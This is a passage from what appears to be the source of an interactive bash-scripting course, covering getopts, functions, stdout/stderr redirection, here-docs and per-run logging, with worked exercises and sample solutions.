echo 'with $*:';   show $*
echo 'with "$*":'; show "$*"
# Output of: bash args.sh web1 "app server" db1
# with "$@":
#   3 args:
#     <web1>
#     <app server>
#     <db1>
# with $*:
#   4 args:
#     <web1>
#     <app>
#     <server>
#     <db1>
# with "$*":
#   1 args:
#     <web1 app server db1>` },
      { title: 'Return codes for yes/no, output for data', html: `<p>A function that finds the newest release folder should <b>echo</b> the name (data) and <b>return 1</b> when there is none (status). The caller can then do both at once: <code>if rel="$(latest_release DIR)"; then</code>. <code>sort -V</code> sorts versions the way humans expect, so 1.10.0 comes after 1.9.0.</p>`, code: B`#!/usr/bin/env bash
set -euo pipefail
latest_release() {                       # latest_release DIR -> prints newest version folder
  local dir="$1" newest
  newest="$(find "$dir" -mindepth 1 -maxdepth 1 -type d -printf '%f\n' | sort -V | tail -n 1)"
  [[ -n $newest ]] || return 1           # status: nothing found
  echo "$newest"                         # data
}
d="$(mktemp -d)"; mkdir "$d"/{1.9.0,1.10.0,1.2.3}
if rel="$(latest_release "$d")"; then echo "latest: $rel"; fi
if ! rel="$(latest_release "$(mktemp -d)")"; then echo "no releases found"; fi
# Output:
# latest: 1.10.0
# no releases found` },
      { title: 'Why local matters', html: `<p>Two functions in a 300-line deploy script both used a variable called <code>count</code>. One of them reset it to 0 in the middle of the other's loop, and the script deployed to only half the hosts. Without <code>local</code>, every variable a function sets is <b>global</b>.</p>`, code: B`#!/usr/bin/env bash
count=10
bump_global() { count=$(( count + 1 )); }
bump_local()  { local count=0; count=$(( count + 1 )); echo "inside: $count"; }
bump_global; echo "after bump_global: $count"
bump_local;  echo "after bump_local:  $count"
# Output:
# after bump_global: 11
# inside: 1
# after bump_local:  11` },
      { title: 'getopts in action: good input, a typo and a missing value', html: `<p>Running the skeleton from the code tab with three different command lines. Bad input fails fast with a non-zero exit code (${H.c('r', '1')} from <code>die</code>, ${H.c('r', '2')} for failed validation) and help text, before anything touches a server. Lines starting with a time are <code>log</code> output on stderr.</p>`, code: B`bash deploy.sh -e prod -v 1.4.2 -n web1 web2
# 09:14:03 [deploy.sh] deploying 1.4.2 to 2 host(s) in prod
# [dry-run] deploy 1.4.2 to web1
# [dry-run] deploy 1.4.2 to web2
# 09:14:03 [deploy.sh] done

bash deploy.sh -e prod -x
# usage: deploy.sh -e ENV -v VERSION [-n] HOST...   (help text, then)
# 09:14:05 [deploy.sh] ERROR: unknown option -x      (exit 1 from die)

bash deploy.sh -e prod -v 1.4
# 09:14:07 [deploy.sh] -v must look like 1.4.2      (exit 2)` }
    ],
    deepDive: `<p>🟣 <b>Functions run in the current shell.</b> Unlike a separate script, a function can change the caller's variables and current directory, and an <code>exit</code> inside it ends the <b>whole script</b>. That is why <code>die()</code> works. But a function called inside <code>$( )</code> runs in a subshell: its <code>exit</code> only leaves the subshell, and variables it sets are lost. Design accordingly: functions that compute something echo it; functions that change state are called directly.</p>
      <p><b><code>local x="$(cmd)"</code> hides failures.</b> The exit status of that line is the status of <code>local</code> (always 0), not of <code>cmd</code>. Under <code>set -e</code> a failing <code>cmd</code> is silently ignored. Split it: <code>local x; x="$(cmd)"</code>. ShellCheck reports this as SC2155.</p>
      <p><b>Return values are 0-255.</b> <code>return 300</code> wraps around. Never use <code>return</code> to hand back data such as a count or a port; echo it. Exit codes are for "did it work".</p>
      <p><b>Long options and subcommands.</b> Tools like <code>backup.sh run --dry-run --db orders</code> need a manual parser: <code>while (( $# )); do case $1 in --dry-run) dry=1 ;; --db) db="$2"; shift ;; --) shift; break ;; -*) die "unknown $1" ;; *) break ;; esac; shift; done</code>. Check <code>$2</code> exists before using it. GNU <code>getopt</code> (the external program, not the builtin) can parse long options too, but its output must be <code>eval</code>ed carefully, so many teams prefer the plain loop.</p>
      <p><b>Libraries.</b> Shared helpers (log, die, retry) can live in <code>lib.sh</code> and be loaded with <code>source "$(dirname "$(realpath "$0")")/lib.sh"</code>. Keep that file free of side effects (only definitions), so sourcing it is always safe. When a "script" grows past a few hundred lines, with JSON handling and complex data, that is the sign to move it to Python (Cloud &amp; DevOps 7).</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> "turn these runbook steps into a bash CLI with getopts, usage and dry-run" is a perfect prompt: you get a solid skeleton in seconds, and you spend your time on the real logic and the review. Assistants are also good at writing the <code>usage()</code> text and long-option parsers, which are boring to type.</p>
      <p><b>Where it goes wrong:</b> generated scripts often forget <code>local</code>, use <code>$*</code> or unquoted <code>$@</code> when forwarding arguments, mix log messages into function output (so <code>x="$(fn)"</code> captures the log lines too), and skip validation (any string accepted as an environment name). <b>Your review checklist:</b> every function variable is local, every forward uses <code>"$@"</code>, logs go to stderr, bad input exits non-zero with usage, and a dry-run mode exists for anything destructive.</p>`,
    problems: [P({
      t: 'Build logq: a small log search tool with options', l: 'Medium', tags: ['getopts', 'functions', 'arguments', 'logs'], co: ['Rackspace', 'Microsoft'],
      s: `<p>Support engineers keep typing long grep pipelines to pull errors out of app logs. Build <code>logq.sh [-l LEVEL] [-n LINES] [-c] FILE...</code>:</p>
<ul><li><code>-l LEVEL</code>: one of DEBUG, INFO, WARN, ERROR (default ERROR); matches lines containing <code>level=LEVEL</code>.</li>
<li><code>-n LINES</code>: show only the last LINES matches per file (default 20).</li>
<li><code>-c</code>: print only a count per file.</li>
<li>One or more files; <code>.gz</code> files must work too. A missing file is reported and skipped, and the exit code is 1 if any file was missing.</li>
<li><code>-h</code> prints help; bad options print help and exit 2.</li></ul>`,
      ex: `<p><code>logq.sh -c -l WARN app.log app.log.1.gz</code> → ${H.c('g', 'app.log: 12')} and ${H.c('g', 'app.log.1.gz: 40')}, exit 0. <code>logq.sh -l FATAL app.log</code> → ${H.c('r', 'LEVEL must be one of DEBUG INFO WARN ERROR')}, exit 2. <code>logq.sh app.log nope.log</code> → errors from app.log, then ${H.c('r', 'logq: nope.log: no such file')}, exit 1.</p>`,
      bw: `<p>Copy-pasting <code>grep level=ERROR app.log | tail -n 20</code> and editing it each time. It does not handle compressed rotated logs, loses track of which file a line came from, and every engineer has a slightly different version. A first script often uses <code>$1</code> for the level and <code>$2</code> for the file, so adding options or more files breaks every caller.</p>`,
      bc: B`#!/bin/bash
# logq.sh LEVEL FILE   - positional only, no validation, one file, no .gz
grep "level=$1" $2 | tail -n 20`,
      q: ['After the getopts loop, how do you get just the file names into <code>"$@"</code>?', ['<code>shift $((OPTIND - 1))</code>', '<code>shift $OPTIND</code>', '<code>OPTIND=1</code>', 'Nothing: getopts removes options by itself'], 0, 'OPTIND is the index of the next argument to process, starting at 1. Shifting OPTIND - 1 removes exactly the option words. getopts never changes "$@" by itself.'],
      h: ['<p>Hint 1: getopts option string <code>\':l:n:ch\'</code>. Validate LEVEL with a <code>case</code> and LINES with a regex after the loop, then <code>shift $((OPTIND - 1))</code>.</p>', '<p>Hint 2: write a function <code>read_file()</code> that prints a file\'s contents, using <code>zcat</code> for names ending in <code>.gz</code> and <code>cat</code> otherwise. Then the rest of the pipeline does not care.</p>', '<p>Hint 3: inside the per-file loop, <code>grep</code> returns 1 when nothing matches. With <code>pipefail</code> on, that looks like a failure, so add <code>|| true</code> on purpose and comment why. Keep a <code>rc</code> variable set to 1 when any file is missing, and <code>exit "$rc"</code> at the end.</p>'],
      a: `<p>Structure the tool as <code>usage</code>, <code>die</code>, <code>read_file</code>, <code>query_file</code> and <code>main "$@"</code>. Parse options with getopts, then validate: LEVEL through a <code>case</code> on the four allowed values, LINES with <code>^[1-9][0-9]*$</code>, and at least one file. Each file goes through <code>read_file</code> (zcat for .gz) into <code>grep -F "level=$level"</code>. <code>-F</code> means fixed text, not a regex, so a level is matched literally. Count mode uses <code>grep -c</code>, else <code>tail -n</code> with a file-name prefix. "No match" is not an error, so <code>|| true</code> stops <code>pipefail</code> from ending the script. Missing files go to stderr and set <code>rc=1</code>, but the other files are still processed, which is what an engineer under pressure wants.</p>`,
      code: B`#!/usr/bin/env bash
# logq.sh [-l LEVEL] [-n LINES] [-c] FILE...   search app logs (plain or .gz) by level
set -euo pipefail

usage() {
  cat <<USAGE
usage: logq.sh [-l LEVEL] [-n LINES] [-c] FILE...
  -l LEVEL   DEBUG, INFO, WARN or ERROR (default ERROR)
  -n LINES   show the last LINES matches per file (default 20)
  -c         only print a count per file
  -h         help
USAGE
}
die() { echo "logq: $*" >&2; exit 2; }

read_file() {                          # read_file FILE -> contents on stdout
  case "$1" in
    *.gz) zcat -- "$1" ;;
    *)    cat -- "$1" ;;
  esac
}

query_file() {                         # query_file FILE LEVEL LINES COUNT_ONLY
  local file="$1" level="$2" lines="$3" count_only="$4" n
  if (( count_only )); then
    n="$(read_file "$file" | grep -cF "level=$level" || true)"   # grep -c prints 0 and exits 1 on no match
    echo "$file: $n"
  else
    read_file "$file" | grep -F "level=$level" | tail -n "$lines" | sed "s|^|$file: |" || true
  fi
}

main() {
  local level=ERROR lines=20 count_only=0 opt rc=0 f
  while getopts ':l:n:ch' opt; do
    case "$opt" in
      l) level="$OPTARG" ;;
      n) lines="$OPTARG" ;;
      c) count_only=1 ;;
      h) usage; exit 0 ;;
      :) usage >&2; die "option -$OPTARG needs a value" ;;
      \?) usage >&2; die "unknown option -$OPTARG" ;;
    esac
  done
  shift $(( OPTIND - 1 ))

  case "$level" in DEBUG|INFO|WARN|ERROR) ;; *) die "LEVEL must be one of DEBUG INFO WARN ERROR" ;; esac
  [[ $lines =~ ^[1-9][0-9]*$ ]] || die "LINES must be a positive whole number"
  (( $# > 0 )) || { usage >&2; exit 2; }

  for f in "$@"; do
    if [[ ! -r $f ]]; then
      echo "logq: $f: no such file" >&2
      rc=1
      continue
    fi
    query_file "$f" "$level" "$lines" "$count_only"
  done
  exit "$rc"
}

main "$@"`,
      cx: `<p>One streaming pass per file: O(size of the logs), constant memory, because grep and tail never load the whole file. Compressed files cost extra CPU for zcat.</p>`,
      f: ['How would you add a <code>--since 10:00</code> option that only keeps lines after a time?', 'The file name is used inside a sed replacement. What could go wrong with odd file names, and how would you avoid sed there?']
    })]
  });

  // ───────────────────────── Topic 4: pipes and redirection in scripts ─────────────────────────
  topics.push({
    title: 'Pipes and Redirection in Scripts: Logs, Here-docs and Where Errors Go',
    analogy: `<p>Every program has three <b>hoses</b>: one coming in (<b>stdin</b>, 0) and two going out: <b>stdout</b> (1) for normal results and <b>stderr</b> (2) for complaints. By default both outgoing hoses point at your screen. Redirection is <b>re-plumbing the hoses</b> before the program starts: send results into a file, send complaints into the bin, or join both into one hose. A pipe <code>|</code> connects one program's results hose to the next program's intake. The plumbing is done <b>left to right</b>, which is why the order of <code>&gt;file 2&gt;&amp;1</code> matters.</p>`,
    explain: `<p>🟢 <b>Quick recap</b> (the kernel side is in CS Core 8). In scripts you use these every day:</p>
      ${H.table(['Syntax', 'Effect', 'Ops use'], [
        ['<code>cmd &gt; file</code>', 'stdout to file (overwrite)', 'write a report'],
        ['<code>cmd &gt;&gt; file</code>', 'stdout to file (append)', 'a job log that grows each run'],
        ['<code>cmd 2&gt; err.txt</code>', 'stderr to a file', 'keep errors apart'],
        ['<code>cmd &gt; out.log 2&gt;&amp;1</code>', 'both to out.log (order matters!)', 'cron jobs: keep everything'],
        ['<code>cmd &amp;&gt; out.log</code>', 'bash shorthand for the line above', 'same, bash only'],
        ['<code>cmd 2&gt;/dev/null</code>', 'throw errors away', 'only when you truly expect and ignore them'],
        ['<code>echo msg &gt;&amp;2</code>', 'write your own message to stderr', 'log and error lines in scripts'],
        ['<code>cmd | tee -a file</code>', 'show on screen <b>and</b> append to file', 'watch a job while keeping a log'],
        ['<code>cmd &lt; file</code>', 'stdin from a file', '<code>while read</code> loops, <code>mysql &lt; dump.sql</code>']
      ])}
      <p>🟢 <b>Why stdout and stderr stay separate.</b> stdout is <b>data</b> that the next command or a variable will use. stderr is <b>for humans</b>. If your script prints "Starting backup..." on stdout, then <code>size="$(./backup.sh)"</code> captures that text too. Rule: data to stdout, messages to stderr.</p>
      <p>🔵 <b>Logging a whole script.</b> Instead of adding <code>&gt;&gt; "$LOG"</code> to every line, re-plumb the script itself once at the top: <code>exec &gt;&gt; "$LOG" 2&gt;&amp;1</code> (everything to the file), or <code>exec &gt; &gt;(tee -a "$LOG") 2&gt;&amp;1</code> (to the file <b>and</b> the screen). <code>exec</code> without a command changes the hoses of the current shell for all later commands.</p>
      <p>🔵 <b>Here-docs write config files.</b> <code>cat &gt; /etc/app.conf &lt;&lt;'EOF'</code> ... <code>EOF</code> writes the lines in between. With the delimiter <b>quoted</b> (<code>'EOF'</code>), nothing inside is expanded: what you see is what you get. Unquoted (<code>EOF</code>), <code>$vars</code> and <code>$(cmds)</code> are filled in, which is how you template a config. A here-string <code>&lt;&lt;&lt; "$var"</code> feeds one value to stdin.</p>
      <p>🔵 <b>Root-owned files.</b> <code>sudo echo "x" &gt; /etc/file</code> fails: the redirection is done by <b>your</b> shell, before sudo runs. Use <code>echo "x" | sudo tee /etc/file &gt; /dev/null</code> (or <code>tee -a</code> to append).</p>
      <p>🔵 <b>Process substitution</b> <code>&lt;(cmd)</code> turns a command's output into something that looks like a file: <code>diff &lt;(sort expected.txt) &lt;(sort running.txt)</code> compares two command outputs without temp files. And <code>while read ...; done &lt; &lt;(cmd)</code> reads command output in the main shell, so variables set in the loop survive.</p>`,
    clues: [
      '"cron job output disappears" / "no log of what happened" → <code>&gt;&gt; "$LOG" 2&gt;&amp;1</code> on the cron line or <code>exec</code> at the top of the script',
      '"errors still show on the screen even though I redirected" → wrong order: <code>2&gt;&amp;1 &gt;file</code> instead of <code>&gt;file 2&gt;&amp;1</code>',
      '"sudo echo into /etc gives Permission denied" → the redirect runs as you: use <code>| sudo tee</code>',
      '"captured output contains log messages" → messages must go to stderr with <code>&gt;&amp;2</code>',
      '"write a config file from a script" → here-doc; quote the delimiter unless you mean to expand variables',
      '"compare two lists" / "what is in A but not in B" → <code>diff</code> or <code>comm</code> with <code>&lt;(sort ...)</code>'
    ],
    code: [B`#!/usr/bin/env bash
# Lab: logging.sh - one log file per run, everything also shown on screen.
# Run: bash logging.sh ; then look at the log path it prints.
set -euo pipefail

LOG_DIR="\${LOG_DIR:-$HOME/joblogs}"            # override with LOG_DIR=/var/log/myjob
mkdir -p "$LOG_DIR"
LOG="$LOG_DIR/\${0##*/}-$(date -u +%Y%m%dT%H%M%SZ).log"

# From here on, stdout and stderr of every command go to the screen AND the log.
exec > >(tee -a "$LOG") 2>&1

log() { printf '%s %s\n' "$(date -u +%FT%TZ)" "$*" >&2; }   # messages -> stderr

log "start, logging to $LOG"
log "disk usage:"
df -h / | sed 's/^/    /'                         # command output, indented
ls /does-not-exist || log "expected failure above, carrying on"

# Write a config file with a here-doc. 'EOF' quoted = no expansion inside.
conf="$(mktemp)"
cat > "$conf" <<'EOF'
# generated by logging.sh
listen = 0.0.0.0:8080
path   = $HOME/data        # stays literally $HOME/data
EOF
log "wrote $conf:"
sed 's/^/    /' "$conf"
rm -f -- "$conf"
log "done"`],
    codeTitle: ['Whole-script logging with exec and tee, plus a here-doc'],
    viz: [{
      title: 'Redirections are applied left to right',
      input: '>out.log 2>&1',
      inputLabel: 'redirections for: noisy (prints a result to stdout and an error to stderr)',
      gen: function (input) {
        var toks = String(input || '').trim().split(/\s+/).filter(Boolean);
        if (!toks.length || toks.length > 6) throw new Error('Give 1-6 redirections like: >out.log 2>&1');
        var fd = { 0: 'keyboard', 1: 'screen', 2: 'screen' };
        function tbl(h) { return { type: 'table', label: 'file descriptor table of noisy', columns: ['fd', 'name', 'points to'], rows: [['0', 'stdin', fd[0]], ['1', 'stdout', fd[1]], ['2', 'stderr', fd[2]]], hl: h || {} }; }
        var f = [{ narr: 'Before any redirection, the command inherits the terminal: fd 1 (stdout) and fd 2 (stderr) both point at the <b>screen</b>. <code>noisy</code> prints "result" on fd 1 and "an error" on fd 2.', parts: [tbl()] }];
        toks.forEach(function (t) {
          var m;
          if ((m = t.match(/^&(>>?)(\S+)$/))) {
            var tgt = m[2] + (m[1] === '>>' ? ' (append)' : '');
            fd[1] = tgt; fd[2] = tgt;
            f.push({ narr: '<code>' + H.esc(t) + '</code> is bash shorthand for "stdout and stderr both to ' + H.esc(m[2]) + '". Both rows change at once.', parts: [tbl({ 1: 'ok', 2: 'ok' })] });
          } else if ((m = t.match(/^(\d?)>&(\d)$/))) {
            var a = m[1] === '' ? '1' : m[1], b = m[2];
            if (!(b in fd)) throw new Error('Only fds 0, 1, 2 are supported here');
            fd[a] = fd[b];
            f.push({ narr: '<code>' + H.esc(t) + '</code> means "make fd ' + a + ' point wherever fd ' + b + ' points <b>right now</b>". fd ' + b + ' points at <b>' + H.esc(fd[b]) + '</b>, so fd ' + a + ' now does too. It copies the current target; it does not follow later changes to fd ' + b + '.', parts: [tbl(one(a, 'cur'))] });
          } else if ((m = t.match(/^(\d?)(>>?|<)(\S+)$/))) {
            var n = m[1] === '' ? (m[2] === '<' ? '0' : '1') : m[1];
            if (!(n in fd)) throw new Error('Only fds 0, 1, 2 are supported here');
            fd[n] = m[3] + (m[2] === '>>' ? ' (append)' : '');
            f.push({ narr: '<code>' + H.esc(t) + '</code> points fd ' + n + ' at <b>' + H.esc(m[3]) + '</b>' + (m[2] === '>>' ? ', adding to the end instead of emptying it first' : m[2] === '>' ? ' (the file is emptied first)' : '') + '.' + (m[3] === '/dev/null' ? ' /dev/null swallows everything written to it.' : ''), parts: [tbl(one(n, 'ok'))] });
          } else throw new Error('Unknown redirection "' + t + '". Try >f, >>f, 2>f, 2>&1, &>f, <f');
        });
        var res = fd[1], err = fd[2];
        f.push({ narr: 'Final plumbing: "result" goes to <b>' + H.esc(res) + '</b>, "an error" goes to <b>' + H.esc(err) + '</b>. ' + (res === err ? H.c('g', 'Both end up in the same place, which is what a cron log needs.') : (err === 'screen' ? H.c('r', 'Errors still hit the screen, and under cron they are lost or mailed. Compare >out.log 2>&1 with 2>&1 >out.log.') : 'They go to different places, which is good when you want to keep errors apart.')), parts: [
          tbl({ 1: 'sel', 2: res === err ? 'sel' : 'bad' }),
          { type: 'map', label: 'where each line ends up', entries: [['result (fd 1)', res], ['an error (fd 2)', err]] }
        ] });
        return pad4(f, 'Compare with other orders: <code>&gt;out.log 2&gt;&amp;1</code>, <code>2&gt;&amp;1 &gt;out.log</code>, <code>&amp;&gt;out.log</code> or <code>2&gt;/dev/null</code>.');
      }
    }, {
      title: 'A pipeline: data flows on stdout, errors bypass it',
      input: 'journalctl -u app --since today | grep -i error | tee errors.txt | wc -l',
      inputLabel: 'a pipeline of 2-5 commands separated by |',
      gen: function (input) {
        var cmds = String(input || '').split('|').map(function (s) { return s.trim(); }).filter(Boolean);
        if (cmds.length < 2 || cmds.length > 5) throw new Error('Give 2-5 commands separated by |');
        var nodes = [], edges = [], n = cmds.length;
        cmds.forEach(function (c, i) { nodes.push(box('c' + i, c.split(/\s+/).slice(0, 2).join(' '), 8 + i * (84 / Math.max(1, n - 1)), 14, 16)); });
        nodes.push(box('scr', 'screen (stderr)', 50, 42, 22));
        nodes.push(box('out', 'screen (stdout)', 92, 42, 18));
        for (var i = 0; i < n - 1; i++) edges.push(['c' + i, 'c' + (i + 1), 'pipe']);
        cmds.forEach(function (_, i) { edges.push(['c' + i, 'scr', '2']); });
        edges.push(['c' + (n - 1), 'out', '1']);
        function g(hl, ehl) { return { type: 'graph', label: 'pipeline', directed: true, height: 52, nodes: nodes, edges: edges, hl: hl || {}, ehl: ehl || {} }; }
        var f = [{ narr: 'Bash starts <b>all ' + n + '</b> commands at the same time, each as its own process. Each <code>|</code> connects the stdout of the left command to the stdin of the right one. Data streams through in small chunks, so even a 10 GB log never has to fit in memory.', parts: [g()] }];
        for (var j = 0; j < n - 1; j++) {
          var e = {}; e['c' + j + '-c' + (j + 1)] = 'ok';
          var h = {}; h['c' + j] = 'cur'; h['c' + (j + 1)] = 'ok';
          f.push({ narr: '<code>' + H.esc(cmds[j]) + '</code> writes its results on stdout, straight into the pipe to <code>' + H.esc(cmds[j + 1]) + '</code>.' + (/^tee\b/.test(cmds[j]) ? ' <code>tee</code> also writes a copy to a file on the way through.' : ''), parts: [g(h, e)] });
        }
        var es = {}; cmds.forEach(function (_, i) { es['c' + i + '-scr'] = 'bad'; });
        f.push({ narr: 'Error messages travel on <b>stderr</b>, which is <b>not</b> connected to the pipe. They go straight to the screen from every stage. That is why a pipe "hides" nothing from you on the terminal, but cron, which has no screen, may lose them unless you redirect.', parts: [g({ scr: 'bad' }, es)] });
        var last = {}; last['c' + (n - 1) + '-out'] = 'sel';
        f.push({ narr: 'Only the <b>last</b> command\'s stdout reaches the screen (or a variable, or a file). And by default only the last command\'s <b>exit code</b> becomes <code>$?</code>. If an earlier stage fails, you may never know. The next topic fixes that with <code>set -o pipefail</code> and <code>PIPESTATUS</code>.', parts: [g({ out: 'sel' }, last), { type: 'array', label: 'PIPESTATUS (exit code of each stage)', values: cmds.map(function (_, i) { return i === 0 && n > 2 ? 1 : 0; }), idxLabels: cmds.map(function (c) { return c.split(/\s+/)[0]; }), hl: n > 2 ? { 0: 'bad' } : {} }] });
        return f;
      }
    }],
    examples: [
      { title: 'The order of 2>&1 decides where errors go', html: `<p>A cron line ended in <code>2&gt;&amp;1 &gt;&gt; job.log</code>. The log never contained errors, and the errors went to cron's mail instead, which nobody read. Redirections are applied left to right: <code>2&gt;&amp;1</code> copies "where stdout points <b>now</b>" (the screen) before stdout is moved to the file. Run this and compare the two log files.</p>`, code: B`#!/usr/bin/env bash
cd "$(mktemp -d)"
noisy() { echo "normal output"; echo "an error" >&2; }
noisy > a.log 2>&1        # right: stdout to a.log, then stderr to the same place
noisy 2>&1 > b.log        # wrong: stderr to the old stdout (screen), then stdout to b.log
echo "--- a.log:"; cat a.log
echo "--- b.log:"; cat b.log
# Output (the first line comes from the wrong version, straight to the screen):
# an error
# --- a.log:
# normal output
# an error
# --- b.log:
# normal output` },
      { title: 'Here-doc: quoted vs unquoted delimiter', html: `<p>A provisioning script wrote a shell profile with an unquoted here-doc, so <code>$PATH</code> was replaced by the <b>provisioning</b> machine's PATH at write time, frozen into the file forever. Quote the delimiter when the text must stay literal; leave it unquoted only when you want the values filled in now.</p>`, code: B`#!/usr/bin/env bash
name=web1
cat <<EOT
unquoted delimiter: host=$name, today=$(date -u +%Y)
EOT
cat <<'EOT'
quoted delimiter:   host=$name, today=$(date -u +%Y)
EOT
# Output (in 2026):
# unquoted delimiter: host=web1, today=2026
# quoted delimiter:   host=$name, today=$(date -u +%Y)` },
      { title: 'Which expected services are missing? (process substitution)', html: `<p>An audit asks: "which services from our standard list are not running on this host?" <code>comm -23</code> prints lines only in the first sorted input. <code>&lt;(sort file)</code> feeds sorted output without temp files. On a real host, the second list would come from <code>systemctl list-units --type=service --state=running --no-legend</code>.</p>`, code: B`#!/usr/bin/env bash
cd "$(mktemp -d)"
printf 'nginx\nsshd\ncron\n'    > expected.txt
printf 'cron\nnginx\nchronyd\n' > running.txt
diff <(sort expected.txt) <(sort running.txt) || true   # diff exits 1 when files differ
comm -23 <(sort expected.txt) <(sort running.txt) | sed 's/^/missing: /'
# Output:
# 0a1
# > chronyd
# 3d3
# < sshd
# missing: sshd` },
      { title: 'Writing a root-owned config file', html: `<p>A setup script needed to add a line to <code>/etc/hosts</code> and write a sysctl file. <code>sudo echo ... &gt;&gt; /etc/hosts</code> fails with "Permission denied", because the <code>&gt;&gt;</code> is opened by your own unprivileged shell before sudo even starts. <code>sudo tee</code> opens the file as root. The <code>&gt; /dev/null</code> stops tee from echoing the text back.</p>`, code: B`# fails: the redirection is done by your shell, not by sudo
# sudo echo "10.0.0.5 db.internal" >> /etc/hosts

# works: tee runs as root and opens the file itself
echo "10.0.0.5 db.internal" | sudo tee -a /etc/hosts > /dev/null

# a whole file from a here-doc, written as root, mode set explicitly
sudo tee /etc/sysctl.d/90-app.conf > /dev/null <<'EOF'
net.core.somaxconn = 4096
vm.swappiness = 10
EOF
sudo chmod 644 /etc/sysctl.d/90-app.conf
sudo sysctl --system | tail -n 2` }
    ],
    deepDive: `<p>🟣 <b><code>exec &gt; &gt;(tee ...)</code> under the hood.</b> <code>&gt;(cmd)</code> starts <code>tee</code> as a background process connected by a pipe and gives you a path like <code>/dev/fd/63</code>. <code>exec &gt;</code> points the script's stdout at it. Two side effects: tee may still be writing the last lines when the script exits (add a short <code>wait</code> or accept that the final line can trail the prompt), and the order of stdout and stderr lines can interleave slightly differently than on a terminal, because both are buffered separately by the programs writing them.</p>
      <p><b>Buffering.</b> Programs write to a terminal line by line, but to a pipe or file in blocks of about 4 to 64 KB. A Python or grep process in a pipe can therefore look "stuck" with no output for minutes. <code>grep --line-buffered</code>, <code>python -u</code>, or <code>stdbuf -oL cmd</code> switch to line buffering when you are watching a live log through a pipe.</p>
      <p><b>The file is emptied before the command runs.</b> <code>sort file &gt; file</code> gives you an empty file, because the shell truncates it first and sort then reads nothing. Write to a temp file and <code>mv</code> it, or use <code>sponge</code> from moreutils. <code>set -o noclobber</code> makes <code>&gt;</code> refuse to overwrite an existing file (<code>&gt;|</code> forces it), a cheap safety net in scripts that create reports.</p>
      <p><b>stdin surprises in loops.</b> Inside <code>while read -r host; do ssh "$host" uptime; done &lt; hosts.txt</code>, ssh reads the <b>rest of hosts.txt</b> from stdin, so the loop stops after the first host. Use <code>ssh -n</code> or <code>&lt; /dev/null</code> for commands inside such loops, or read the list on another fd: <code>while read -r -u 3 host; do ...; done 3&lt; hosts.txt</code>.</p>
      <p><b>Logs for machines.</b> Plain text is fine for a cron job. When logs go to a central system (CloudWatch, Loki, Elasticsearch), prefer one line per event with a UTC ISO timestamp and <code>key=value</code> or JSON fields, and use <code>logger -t myjob "message"</code> to write into the system journal so the existing log shipping picks it up.</p>`,
    aiEra: `<p>🤖 <b>What AI changes:</b> assistants are very good at explaining a confusing redirection ("what does <code>3&gt;&amp;1 1&gt;&amp;2 2&gt;&amp;3</code> do?") and at generating the logging boilerplate at the top of a script. Asking for "a function that logs to stderr with UTC timestamps and a script name" saves typing.</p>
      <p><b>Where it goes wrong:</b> generated scripts often redirect everything to <code>/dev/null</code> to look "clean", which hides the exact error you need at 3 a.m.; mix messages into stdout so captured values are corrupted; or use unquoted here-docs that freeze <code>$PATH</code> or expose a secret pulled from the environment into a world-readable file. <b>Your job:</b> check where every stream ends up, make sure secrets never land in log files (logs get shipped and read widely), and keep <code>2&gt;/dev/null</code> only where you have a comment saying why the error is expected.</p>`,
    problems: [P({
      t: 'Give a maintenance script a proper log', l: 'Medium', tags: ['redirection', 'logging', 'tee', 'exec'], co: ['IBM', 'Accenture'],
      s: `<p>A weekly maintenance script (clean a cache, vacuum a database, restart a worker) runs from cron. When it fails, nobody can tell which step failed or when, because its output goes nowhere. Add logging so that:</p>
<ul><li>each run writes to its own file <code>$LOG_DIR/maint-YYYYMMDDTHHMMSSZ.log</code> (default <code>LOG_DIR=/var/log/maint</code>, overridable);</li>
<li>everything (stdout and stderr of every command) goes to the log, and also to the screen when a human runs it in a terminal;</li>
<li>every step is logged with a UTC timestamp, a start line, and an end line with its exit status;</li>
<li>logs older than 30 days are deleted at the start of each run;</li>
<li>the script still exits non-zero if a step fails.</li></ul>`,
      ex: `<p>A run creates <code>/var/log/maint/maint-20260302T030001Z.log</code> containing lines such as ${H.c('b', '2026-03-02T03:00:01Z step clean_cache: start')} ... ${H.c('g', 'step clean_cache: ok')} ... ${H.c('r', 'step vacuum_db: FAILED (exit 1)')}, and the script exits 1. Running it by hand also prints the same lines on screen.</p>`,
      bw: `<p>Appending <code>&gt;&gt; /tmp/maint.log</code> to some lines: errors (stderr) are missed, the file grows forever, runs are mixed together, there are no timestamps, and <code>/tmp</code> may be wiped on reboot. Redirecting everything to <code>/dev/null</code> "to keep cron quiet" throws away the only evidence.</p>`,
      bc: B`#!/bin/bash
echo "cleaning" >> /tmp/maint.log
rm -rf /var/cache/app/tmp/*            # errors from here go nowhere useful
psql -c 'VACUUM ANALYZE' appdb > /dev/null 2>&1
systemctl restart app-worker`,
      q: ['Which line at the top of the script sends all later output to the log file and the screen?', ['<code>exec &gt; &gt;(tee -a "$LOG") 2&gt;&amp;1</code>', '<code>exec 2&gt;&amp;1 &gt; "$LOG"</code>', '<code>tee -a "$LOG"</code>', '<code>set -o log</code>'], 0, 'exec with only redirections re-plumbs the current shell. Pointing stdout at a tee process and then stderr at the same place captures everything. The second option has the order wrong (stderr stays on the screen) and does not show output on screen. tee alone just waits for stdin, and set -o log does not exist.'],
      h: ['<p>Hint 1: build the file name with <code>date -u +%Y%m%dT%H%M%SZ</code>, create the folder with <code>mkdir -p</code>, then do the <code>exec</code> re-plumbing once.</p>', '<p>Hint 2: write a <code>run_step NAME COMMAND...</code> function: log "start", run <code>"$@"</code>, capture the code with <code>if "$@"; then ... else rc=$?</code>, log ok or FAILED, return the code.</p>', '<p>Hint 3: keep going after a failed step only if that makes sense; here every step is independent, so record a global <code>failed=1</code> and <code>exit "$failed"</code> at the end. Clean old logs with <code>find "$LOG_DIR" -name \'maint-*.log\' -mtime +30 -delete</code>.</p>'],
      a: `<p>Set <code>LOG_DIR</code> from the environment with a default, create it, and open a per-run log with a UTC timestamp in its name. <code>exec &gt; &gt;(tee -a "$LOG") 2&gt;&amp;1</code> sends everything to the log and the terminal. A <code>log()</code> helper adds ISO timestamps. A <code>run_step</code> wrapper turns each step into start / ok / FAILED lines with the exit code, so the log answers "which step, when, and how" at a glance. Steps are written as small functions. Old logs are pruned with <code>find -mtime +30 -delete</code>, limited to our own file pattern. The script exits 1 if any step failed, so cron's mail or the monitoring wrapper notices.</p>`,
      code: B`#!/usr/bin/env bash
# maint.sh - weekly maintenance with a per-run log
set -uo pipefail                      # no -e: run_step handles each failure itself

LOG_DIR="\${LOG_DIR:-/var/log/maint}"
